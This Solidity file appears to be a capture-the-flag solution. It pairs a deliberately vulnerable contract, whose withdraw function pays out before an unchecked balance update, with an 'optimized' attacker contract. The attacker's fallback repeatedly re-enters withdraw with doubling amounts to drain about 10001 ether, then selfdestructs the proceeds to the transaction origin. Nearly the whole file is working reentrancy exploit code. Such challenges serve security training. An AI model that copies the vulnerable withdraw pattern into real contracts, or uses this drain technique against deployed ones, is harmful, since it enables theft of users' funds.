// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient funds");
        (bool ok, ) = msg.sender.call{ value: amount }("");
        require(ok, "transfer failed");
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

interface Target {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract OptimizedAttackerSecurity101 {
    constructor(Target target) payable {
        OptimizedAttackerSecurity102 attacker = new OptimizedAttackerSecurity102();
        attacker.attack{ value: msg.value }(target);
    }
}

contract OptimizedAttackerSecurity102 {
    function attack(Target target) external payable {
        target.deposit{ value: msg.value }();
        target.withdraw(msg.value);
    }

    fallback() external payable {
        unchecked {
            if (address(this).balance >= 10001 ether) {
                selfdestruct(payable(tx.origin));
            } else {
                Target target = Target(msg.sender);
                target.deposit{ value: msg.value }();
                if ((msg.value << 1) > 8192 ether) target.withdraw(10001 ether);
                else target.withdraw(msg.value << 1);
            }
        }
    }
}
